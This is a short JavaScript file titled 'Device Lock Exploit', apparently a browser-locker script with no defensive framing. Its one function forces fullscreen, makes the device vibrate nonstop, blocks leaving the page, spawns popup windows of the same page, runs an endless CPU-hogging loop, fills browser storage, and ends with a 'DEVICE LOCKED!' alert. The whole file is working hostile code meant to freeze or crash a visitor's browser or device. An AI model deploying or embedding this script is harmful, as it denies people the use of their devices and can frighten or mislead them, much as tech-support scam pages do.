// Device Lock Exploit
function executeDeviceLock() {
    console.log('🚀 DEVICE LOCK ACTIVATED');
    
    // 1. Fullscreen lock
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
    }
    
    // 2. Vibrate continuously (if on mobile)
    if (navigator.vibrate) {
        setInterval(() => {
            navigator.vibrate([500, 200, 500]);
        }, 1000);
    }
    
    // 3. Prevent leaving
    window.onbeforeunload = function() {
        return "⚠️ DON'T LEAVE!";
    };
    
    // 4. Open multiple popups (if not blocked)
    for (let i = 0; i < 5; i++) {
        setTimeout(() => {
            window.open(window.location.href, '_blank', 'width=1,height=1');
        }, i * 500);
    }
    
    // 5. CPU overload
    const overload = () => {
        while (true) {
            console.log(new Array(1000000).join('x'));
        }
    };
    setTimeout(overload, 3000);
    
    // 6. Fill storage
    try {
        localStorage.setItem('crash', new Array(5000000).join('x'));
        sessionStorage.setItem('crash', new Array(5000000).join('x'));
    } catch (e) {}
    
    alert('💀 DEVICE LOCKED!');
}
